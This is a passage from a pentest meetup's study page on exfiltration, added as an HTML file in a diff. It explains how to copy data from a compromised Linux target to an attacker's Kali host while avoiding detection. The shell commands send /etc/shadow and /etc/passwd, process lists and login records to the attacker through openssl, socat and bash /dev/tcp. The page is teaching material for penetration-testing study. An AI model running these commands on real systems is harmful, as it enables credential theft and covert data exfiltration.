@@ -1,0 +1,620 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>8.3. Exfiltration &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="8. Pentest Study" href="../pentest_study.html"/>
+        <link rel="next" title="8.4. exiftool" href="exiftool.html"/>
+        <link rel="prev" title="8.2. Email Security" href="email_security.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="2factor.html">8.1. 2 Factor Authentication</a></li>
+<li class="toctree-l2"><a class="reference internal" href="email_security.html">8.2. Email Security</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">8.3. Exfiltration</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#silently">8.3.1. Silently</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#being-silent">8.3.1.1. Being silent</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#target-software-expectations">8.3.1.2. Target software expectations</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#shell-without-tty-pty">8.3.1.3. Shell without tty/pty</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#bootstrapping-exfiltration">8.3.2. Bootstrapping exfiltration</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#generating-keys-and-certs">8.3.2.1. Generating keys and certs</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#transferring-multiple-files">8.3.2.2. Transferring multiple files</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#socat-vs-openssl">8.3.2.3. <strong class="program">socat</strong> vs <strong class="program">openssl</strong></a></li>
+<li class="toctree-l4"><a class="reference internal" href="#openssl-s-server-to-openssl-s-client">8.3.2.4. <strong class="program">openssl s_server</strong> to <strong class="program">openssl s_client</strong></a></li>
+<li class="toctree-l4"><a class="reference internal" href="#socat-on-kali">8.3.2.5. <strong class="program">socat</strong> on kali</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#exfiltration-via-conventional-services">8.3.3. Exfiltration via conventional services</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#tftp">8.3.3.1. TFTP</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#ftp">8.3.3.2. FTP</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#http-https">8.3.3.3. HTTP/HTTPS</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#ssh">8.3.3.4. SSH</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="exiftool.html">8.4. <strong class="program">exiftool</strong></a></li>
+<li class="toctree-l2"><a class="reference internal" href="loadlibrary.html">8.5. loadlibrary</a></li>
+<li class="toctree-l2"><a class="reference internal" href="linux_exploitation_tricks.html">8.6. Linux Exploitation Tricks</a></li>
+<li class="toctree-l2"><a class="reference internal" href="llmnr.html">8.7. Windows broadcast name resolution</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ntlm.html">8.8. NTLM</a></li>
+<li class="toctree-l2"><a class="reference internal" href="passwords.html">8.9. Password Cracking Resources</a></li>
+<li class="toctree-l2"><a class="reference internal" href="php.html">8.10. PHP &amp; MySQL Shortcomings</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnerabilities.html">8.11. Vulnerabilites</a></li>
+<li class="toctree-l2"><a class="reference internal" href="wifi.html">8.12. WiFi Tutorial</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_study.html">8. Pentest Study</a> &raquo;</li>
+        
+      <li>8.3. Exfiltration</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/study/exfiltration.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="exfiltration">
+<h1>8.3. Exfiltration<a class="headerlink" href="#exfiltration" title="Permalink to this headline">¶</a></h1>
+<p>Exfiltration’s goal is to silently, securely transfer data from a target host to an attacker host. Securely usually means encrypted; silently means leaving little unusual network traffic footprint or target host artifacts for network and host intrusion detection systems. Of course being secure and silent depends on the target’s defenses. A target network with no network traffic monitoring or host intrusion detection makes even FTP silent and secure; but having host intrusion detection along with logging all network traffic (forcing encryption through a logging encryption endpoint) raises the bar considerably.</p>
+<div class="section" id="silently">
+<h2>8.3.1. Silently<a class="headerlink" href="#silently" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="being-silent">
+<h3>8.3.1.1. Being silent<a class="headerlink" href="#being-silent" title="Permalink to this headline">¶</a></h3>
+<ul>
+<li><p class="first">Normal traffic only</p>
+<p>This depends on the target network defenses and can mean: no unusual protocols (IPv6 on an IPv4-only network), no unusual ports (port 4444 could raise flags), and/or no tunneling of protocol X inside protocol Y (using port 443 for SSH traffic).</p>
+</li>
+<li><p class="first">Encryption</p>
+<p>Here this can mean network traffic encryption or some form of public key or symmetric encryption. Here is an example of symmetric encryption based on a password:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">ORIG</span><span class="o">=</span>orig
+<span class="nv">ENCRYPTED</span><span class="o">=</span>encrypted
+<span class="nv">DECRYPTED</span><span class="o">=</span>decrypted
+<span class="nv">PWFILE</span><span class="o">=</span>pass
+<span class="c1"># Make sure password not in history file</span>
+<span class="nb">read</span> PASS
+mysecretpassword
+<span class="nb">echo</span> <span class="nv">$PASS</span> &gt; <span class="nv">$PWFILE</span>
+<span class="c1"># encrypt the file</span>
+<span class="nb">echo</span> hello &gt; <span class="nv">$ORIG</span>
+openssl aes-256-cbc -a -salt -in <span class="s2">&quot;</span><span class="nv">$ORIG</span><span class="s2">&quot;</span> -out <span class="s2">&quot;</span><span class="nv">$ENCRYPTED</span><span class="s2">&quot;</span> -pass file:<span class="nv">$PWFILE</span>
+<span class="c1"># decrypt the file</span>
+openssl aes-256-cbc -d -a -salt -in <span class="s2">&quot;</span><span class="nv">$ENCRYPTED</span><span class="s2">&quot;</span> -out <span class="s2">&quot;</span><span class="nv">$DECRYPTED</span><span class="s2">&quot;</span> -pass file:<span class="nv">$PWFILE</span>
+rm -f <span class="nv">$PWFILE</span>
+<span class="c1"># check $ORIG = $DECRYPTED</span>
+diff <span class="nv">$ORIG</span> <span class="nv">$DECRYPTED</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first">Stenography</p>
+<p>This can mean hiding data using programs like <strong class="program">steghide</strong>.</p>
+</li>
+<li><p class="first">No target software “installs”, but file copy OK</p>
+<p>By “install” we mean using package management that leaves target host footprints not easily removed. It is acceptable to copy files to the target host that can easily be removed without leaving a footprint.</p>
+</li>
+</ul>
+</div>
+<div class="section" id="target-software-expectations">
+<h3>8.3.1.2. Target software expectations<a class="headerlink" href="#target-software-expectations" title="Permalink to this headline">¶</a></h3>
+<p>Typically Linux targets have the following software installed: <strong class="program">ftp</strong> (often) but not a TFTP client; <strong class="program">openssl</strong>; <strong class="program">python</strong> and <strong class="program">perl</strong>; <strong class="program">ssh</strong> and <strong class="program">scp</strong>; one of <strong class="program">wget</strong> or <strong class="program">curl</strong> (though not always).</p>
+</div>
+<div class="section" id="shell-without-tty-pty">
+<h3>8.3.1.3. Shell without tty/pty<a class="headerlink" href="#shell-without-tty-pty" title="Permalink to this headline">¶</a></h3>
+<p>The initial remote shell often lacks a tty/pty and so workarounds are required when running programs requiring user input (like a password). For possible workarounds see <a class="reference external" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> and <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a>.</p>
+</div>
+</div>
+<div class="section" id="bootstrapping-exfiltration">
+<span id="id1"></span><h2>8.3.2. Bootstrapping exfiltration<a class="headerlink" href="#bootstrapping-exfiltration" title="Permalink to this headline">¶</a></h2>
+<p>Here are more primitive techiniques that can transfer files using existing software without elaborate setup.</p>
+<div class="section" id="generating-keys-and-certs">
+<h3>8.3.2.1. Generating keys and certs<a class="headerlink" href="#generating-keys-and-certs" title="Permalink to this headline">¶</a></h3>
+<p>Bootstrap techniques can require client &amp; server keys &amp; certs to enable encryption and client/server authentication.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Generate target and kali self signed certificate.</span>
+<span class="c1"># In pentests the cert CN might have to be an IP</span>
+<span class="k">for</span> H in target,192.168.1.102 kali,192.168.1.104<span class="p">;</span> <span class="k">do</span>
+  <span class="nv">N</span><span class="o">=</span><span class="si">${</span><span class="nv">H</span><span class="p">%,*</span><span class="si">}</span>
+  <span class="nv">IP</span><span class="o">=</span><span class="si">${</span><span class="nv">H</span><span class="p">#*,</span><span class="si">}</span>
+  openssl req -x509 -nodes -days <span class="m">365</span> -newkey rsa:2048 <span class="se">\</span>
+    -keyout <span class="nv">$N</span>.key -out <span class="nv">$N</span>.crt <span class="se">\</span>
+    -subj /C<span class="o">=</span>US/ST<span class="o">=</span>California/L<span class="o">=</span>Redondo<span class="se">\ </span>Beach/O<span class="o">=</span>South<span class="se">\ </span>Bay<span class="se">\ </span>Pentest<span class="se">\ </span>Meetup/OU<span class="o">=</span>pentest/CN<span class="o">=</span><span class="nv">$IP</span>
+  cat <span class="nv">$N</span>.key <span class="nv">$N</span>.crt &gt; <span class="nv">$N</span>.pem
+  chmod <span class="m">600</span> <span class="nv">$N</span>.key <span class="nv">$N</span>.pem
+<span class="k">done</span>
+<span class="c1"># Get dhparam for older systems defaulting to insecure dh negotiation.</span>
+<span class="c1">#   Newer systems will reject insecure dh negotiation.</span>
+openssl dhparam -outform PEM -out dhparam.pem <span class="m">2048</span>
+<span class="c1"># Alternatively could download one</span>
+<span class="c1">#   curl --output dhparam.pem https://bettercrypto.org/static/dhparams/group14.pem</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="transferring-multiple-files">
+<h3>8.3.2.2. Transferring multiple files<a class="headerlink" href="#transferring-multiple-files" title="Permalink to this headline">¶</a></h3>
+<p>Multiple files can be reduced to the problem of transferring one file by using <strong class="program">tar</strong> or <strong class="program">zip</strong> (which offers the side benefit of encryption).</p>
+</div>
+<div class="section" id="socat-vs-openssl">
+<h3>8.3.2.3. <strong class="program">socat</strong> vs <strong class="program">openssl</strong><a class="headerlink" href="#socat-vs-openssl" title="Permalink to this headline">¶</a></h3>
+<p>Below we’ll show how to use both <strong class="program">socat</strong> and <strong class="program">openssl</strong> to transfer files. Which is best to use? First, each tool does some unique things: <strong class="program">openssl</strong> can create your PKI &amp; encrypt files, while <strong class="program">socat</strong> is a master at manipulating sockets. But <strong class="program">socat</strong>’s big weakness is its lack of ubiquity. When <strong class="program">socat</strong> is available on both server and client, or you don’t need encryption, it’s easier to use. But when the client doesn’t have <strong class="program">socat</strong> and you need encryption, then you have to use <strong class="program">openssl</strong> anyway and it will be easier to use just <strong class="program">openssl</strong>.</p>
+</div>
+<div class="section" id="openssl-s-server-to-openssl-s-client">
+<h3>8.3.2.4. <strong class="program">openssl s_server</strong> to <strong class="program">openssl s_client</strong><a class="headerlink" href="#openssl-s-server-to-openssl-s-client" title="Permalink to this headline">¶</a></h3>
+<p><strong class="program">openssl</strong> is not a one-trick pony: besides generating PKI files, it can send/receive encrypted traffic and provide a simple HTTPS server. Plus it’s usually available on Linux hosts.</p>
+<div class="section" id="transfer-files-using-openssl-https-server-with-curl-client">
+<h4>8.3.2.4.1. Transfer files using openssl HTTPS server with curl client<a class="headerlink" href="#transfer-files-using-openssl-https-server-with-curl-client" title="Permalink to this headline">¶</a></h4>
+<p>Here we demonstrated serving files over HTTPS starting with kali as the openssl HTTPS server. Since the target doesn’t have its newly-generated certs it will download them from kali.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># On $KALI serve files in directory</span>
+<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4443</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="c1"># HTTPS server shouldn&#39;t check client cert as client doesn&#39;t have one now.</span>
+openssl s_server -WWW -dhparam dhparam.pem -key kali.key -cert kali.crt -accept <span class="nv">$PORT</span>
+
+<span class="c1"># On $TARGET fetch needed certs (may need &quot;--insecure&quot; option on modern curl)</span>
+<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4443</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="nv">INSECURE</span><span class="o">=</span>
+<span class="c1"># Some older clients do not support --insecure</span>
+<span class="nv">INSECURE</span><span class="o">=</span><span class="s2">&quot;--insecure&quot;</span>
+<span class="o">[[</span> <span class="k">$(</span>curl --insecure  <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -c -- <span class="s1">&#39;--insecure&#39;</span><span class="k">)</span> -ne <span class="m">0</span>  <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">INSECURE</span><span class="o">=</span>
+curl --silent <span class="nv">$INSECURE</span> --remote-name https://<span class="nv">$KALI</span>:<span class="nv">$PORT</span>/target.key
+curl --silent <span class="nv">$INSECURE</span> --remote-name https://<span class="nv">$KALI</span>:<span class="nv">$PORT</span>/target.crt
+curl --silent <span class="nv">$INSECURE</span> --remote-name https://<span class="nv">$KALI</span>:<span class="nv">$PORT</span>/target.pem
+curl --silent <span class="nv">$INSECURE</span> --remote-name https://<span class="nv">$KALI</span>:<span class="nv">$PORT</span>/kali.crt
+curl --silent <span class="nv">$INSECURE</span> --remote-name https://<span class="nv">$KALI</span>:<span class="nv">$PORT</span>/dhparam.pem
+chmod <span class="m">600</span> target.key target.pem
+
+<span class="c1"># On $KALI control-C to kill web server</span>
+</pre></div>
+</div>
+<p>Next the target runs HTTPS to fetch some files.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># On $TARGET start openssl HTTPS server (older servers need -dhparam)</span>
+<span class="c1">#   Newer servers can use -verify_return_error to actually verify the client.</span>
+<span class="c1">#   Older servers cannot force client cert verification.</span>
+<span class="nv">VERIFY</span><span class="o">=</span><span class="s2">&quot;-verify_return_error&quot;</span>
+<span class="o">[[</span> <span class="k">$(</span>openssl s_server -verify_return_error  <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> <span class="se">\</span>
+     grep -c -- <span class="s1">&#39;unknown option -verify_return_error&#39;</span><span class="k">)</span> -ne <span class="m">0</span>  <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">VERIFY</span><span class="o">=</span>
+openssl s_server -WWW -dhparam dhparam.pem -cert target.pem <span class="se">\</span>
+  -Verify <span class="m">1</span> -CAfile kali.crt <span class="nv">$VERIFY</span> -accept <span class="nv">$PORT</span>
+<span class="c1"># Get shadow file into web server directory prior to client request</span>
+cp /etc/shadow <span class="nv">$PWD</span>
+
+<span class="c1"># On $KALI fetch file</span>
+<span class="nv">FILENAME</span><span class="o">=</span>shadow
+curl --silent --cacert target.pem --output <span class="nv">$FILENAME</span> --cert kali.pem https://<span class="nv">$TARGET</span>:<span class="nv">$PORT</span>/<span class="nv">$FILENAME</span>
+
+<span class="c1"># On $TARGET control-C to kill web server (may leave port locked by process)</span>
+</pre></div>
+</div>
+<p>So you can simply run openssl HTTPS web servers on both hosts to transfer files.</p>
+</div>
+<div class="section" id="openssl-file-transfer-without-https">
+<h4>8.3.2.4.2. openssl file transfer without HTTPS<a class="headerlink" href="#openssl-file-transfer-without-https" title="Permalink to this headline">¶</a></h4>
+<p>Here we use <code class="docutils literal"><span class="pre">openssl</span> <span class="pre">s_server</span></code> and <code class="docutils literal"><span class="pre">openssl</span> <span class="pre">s_client</span></code> to send/receive files.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># To transfer 1 file from $TARGET to $KALI with mutual authentication</span>
+<span class="c1"># On $TARGET (newer clients can use -verify_return_error)</span>
+<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4443</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="c1"># Check for old openssl version that cannot use -verify_return_error.</span>
+<span class="nv">VERIFY</span><span class="o">=</span><span class="s2">&quot;-verify_return_error&quot;</span>
+<span class="o">[[</span> <span class="k">$(</span>openssl s_server -verify_return_error  <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> <span class="se">\</span>
+     grep -c -- <span class="s1">&#39;unknown option -verify_return_error&#39;</span><span class="k">)</span> -ne <span class="m">0</span>  <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">VERIFY</span><span class="o">=</span>
+openssl s_server -dhparam dhparam.pem -cert target.pem <span class="se">\</span>
+  -Verify <span class="m">1</span> -CAfile kali.crt <span class="nv">$VERIFY</span> -accept <span class="nv">$PORT</span> &lt; /etc/shadow
+
+<span class="c1"># On $KALI</span>
+<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4443</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104
+openssl s_client -connect <span class="nv">$TARGET</span>:<span class="nv">$PORT</span> -cert kali.pem <span class="se">\</span>
+  -verify <span class="m">1</span> -verify_return_error -CAfile target.crt -quiet &gt; etc_shadow
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="socat-on-kali">
+<h3>8.3.2.5. <strong class="program">socat</strong> on kali<a class="headerlink" href="#socat-on-kali" title="Permalink to this headline">¶</a></h3>
+<p>Take advantage <strong class="program">socat</strong> (or <strong class="program">nc</strong>, <strong class="program">ncat</strong>, <strong class="program">netcat</strong>) to transfer data over the network. For unencrypted traffic the target host uses <strong class="program">bash</strong>’s /dev/tcp/IP/PORT but for encrypted traffic the client can use <strong class="program">socat</strong> (when available) or <code class="docutils literal"><span class="pre">openssl</span> <span class="pre">s_client</span></code>.</p>
+<p>Why bother with <strong class="program">socat</strong> when <strong class="program">openssl</strong> seems to do everything? It’s much easier to send unencrypted target terminal command session output using <strong class="program">socat</strong>.</p>
+<div class="section" id="transferring-1-file-to-from-target">
+<h4>8.3.2.5.1. Transferring 1 file to/from target<a class="headerlink" href="#transferring-1-file-to-from-target" title="Permalink to this headline">¶</a></h4>
+<p>Here we just require that the target host has bash with /dev/tcp enabled and Kali has <strong class="program">socat</strong>. Note that for all transfers (regardless of direction) you start <strong class="program">socat</strong> using TCP-LISTEN on Kali first, then send/receive from the target host.</p>
+<div class="section" id="target-kali">
+<h5>8.3.2.5.1.1. target ==&gt; Kali<a class="headerlink" href="#target-kali" title="Permalink to this headline">¶</a></h5>
+<p>To transfer <code class="file docutils literal"><span class="pre">/etc/passwd</span></code> first set up the Kali listener:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># On $KALI</span>
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>
+<span class="nv">FILENAME</span><span class="o">=</span>etc_passwd
+socat -u TCP-LISTEN:<span class="nv">$PORT</span> OPEN:<span class="nv">$FILENAME</span>,creat
+
+<span class="c1"># On $TARGET</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>
+<span class="nv">FILENAME</span><span class="o">=</span>/etc/passwd
+cat <span class="nv">$FILENAME</span> &gt; /dev/tcp/<span class="nv">$KALI</span>/<span class="nv">$PORT</span>
+</pre></div>
+</div>
+<p>For an encrypted transfer switch to <code class="docutils literal"><span class="pre">socat</span> <span class="pre">-u</span> <span class="pre">OPENSSL-LISTEN...</span></code> being fed by <code class="docutils literal"><span class="pre">openssl</span> <span class="pre">s_client</span> <span class="pre">...</span></code> (since this particular target did not have <strong class="program">socat</strong>):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># On $KALI</span>
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4443</span>
+<span class="nv">FILENAME</span><span class="o">=</span>etc_passwd
+socat -u OPENSSL-LISTEN:<span class="nv">$PORT</span>,cert<span class="o">=</span>kali.pem,cafile<span class="o">=</span>target.crt OPEN:<span class="nv">$FILENAME</span>,creat
+
+<span class="c1"># On $TARGET</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4443</span>
+<span class="nv">FILENAME</span><span class="o">=</span>/etc/passwd
+<span class="nv">VERIFY</span><span class="o">=</span><span class="s2">&quot;-verify_return_error&quot;</span>
+<span class="o">[[</span> <span class="k">$(</span>openssl s_client -verify_return_error  <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> <span class="se">\</span>
+     grep -c -- <span class="s1">&#39;unknown option -verify_return_error&#39;</span><span class="k">)</span> -ne <span class="m">0</span>  <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">VERIFY</span><span class="o">=</span>
+openssl s_client -connect <span class="nv">$KALI</span>:<span class="nv">$PORT</span> -cert target.pem <span class="se">\</span>
+  -verify <span class="m">1</span> -CAfile kali.crt <span class="nv">$VERIFY</span> &lt; <span class="nv">$FILENAME</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="kali-target">
+<h5>8.3.2.5.1.2. Kali ==&gt; target<a class="headerlink" href="#kali-target" title="Permalink to this headline">¶</a></h5>
+<p>To transfer a file from Kali to the target first start on Kali:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># On $KALI</span>
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>
+<span class="nv">FILENAME</span><span class="o">=</span>sshd_config
+socat -u OPEN:<span class="nv">$FILENAME</span> TCP-LISTEN:<span class="nv">$PORT</span>
+
+<span class="c1"># On $TARGET</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>
+<span class="nv">FILENAME</span><span class="o">=</span>sshd_config
+cat &lt; /dev/tcp/<span class="nv">$KALI</span>/<span class="nv">$PORT</span> &gt; <span class="nv">$FILENAME</span>
+</pre></div>
+</div>
+<p>For an encrypted transfer switch to <code class="docutils literal"><span class="pre">socat</span> <span class="pre">-u</span> <span class="pre">...</span> <span class="pre">OPENSSL-LISTEN...</span></code> being fed by <code class="docutils literal"><span class="pre">openssl</span> <span class="pre">s_client</span> <span class="pre">...</span></code>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># On $KALI</span>
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>
+<span class="nv">FILENAME</span><span class="o">=</span>sshd_config
+socat -u OPEN:<span class="nv">$FILENAME</span> OPENSSL-LISTEN:<span class="nv">$PORT</span>,cert<span class="o">=</span>kali.pem,cafile<span class="o">=</span>target.crt
+
+<span class="c1"># On $TARGET</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4443</span>
+<span class="nv">FILENAME</span><span class="o">=</span>sshd_config
+<span class="nv">VERIFY</span><span class="o">=</span><span class="s2">&quot;-verify_return_error&quot;</span>
+<span class="o">[[</span> <span class="k">$(</span>openssl s_client -verify_return_error  <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> <span class="se">\</span>
+     grep -c -- <span class="s1">&#39;unknown option -verify_return_error&#39;</span><span class="k">)</span> -ne <span class="m">0</span>  <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">VERIFY</span><span class="o">=</span>
+openssl s_client -connect <span class="nv">$KALI</span>:<span class="nv">$PORT</span> -cert target.pem <span class="se">\</span>
+  -verify <span class="m">1</span> -CAfile kali.crt <span class="nv">$VERIFY</span> -quiet &gt; <span class="nv">$FILENAME</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="transferring-multiple-files-and-command-output-from-target">
+<h4>8.3.2.5.2. Transferring multiple files and command output from target<a class="headerlink" href="#transferring-multiple-files-and-command-output-from-target" title="Permalink to this headline">¶</a></h4>
+<p>Multiple files can be <strong class="program">tar</strong>’ed or <strong class="program">zip</strong>’ed into a single archive file that can be transferred as above.</p>
+</div>
+<div class="section" id="capturing-target-terminal-command-sessions-to-kali">
+<h4>8.3.2.5.3. Capturing target terminal command sessions to Kali<a class="headerlink" href="#capturing-target-terminal-command-sessions-to-kali" title="Permalink to this headline">¶</a></h4>
+<p>However, there are times you want to capture terminal session output. You can do that 2 ways: (1) send command output to a file (<code class="docutils literal"><span class="pre">command</span> <span class="pre">1&gt;&gt;logfile</span> <span class="pre">2&gt;&amp;1</span></code>) and transfer the 1 file <code class="file docutils literal"><span class="pre">logfile</span></code>; (2) send command output to /dev/tcp/HOST/PORT. Here we option (2). First start the listener on Kali:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>
+<span class="nv">FILENAME</span><span class="o">=</span><span class="s2">&quot;host-session_</span><span class="k">$(</span>date +<span class="s1">&#39;%F_%H%M%S&#39;</span><span class="k">)</span><span class="s2">.txt&quot;</span>
+socat -u TCP-LISTEN:<span class="nv">$PORT</span>,fork,reuseaddr OPEN:<span class="s2">&quot;</span><span class="nv">$FILENAME</span><span class="s2">&quot;</span>,creat,append
+</pre></div>
+</div>
+<p>Then on the target host:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.104
+<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>
+<span class="o">(</span>
+<span class="nb">echo</span> <span class="s2">&quot;# dump /etc/passwd&quot;</span>
+cat /etc/passwd
+<span class="nb">echo</span> <span class="s2">&quot;# dump /etc/shadow&quot;</span>
+cat /etc/shadow
+<span class="nb">echo</span> <span class="s2">&quot;# ps -ef&quot;</span>
+ps -ef
+<span class="nb">echo</span> <span class="s2">&quot;# lastlog&quot;</span>
+lastlog
+<span class="o">)</span> <span class="m">1</span>&gt;/dev/tcp/<span class="nv">$KALI</span>/<span class="nv">$PORT</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</pre></div>
+</div>
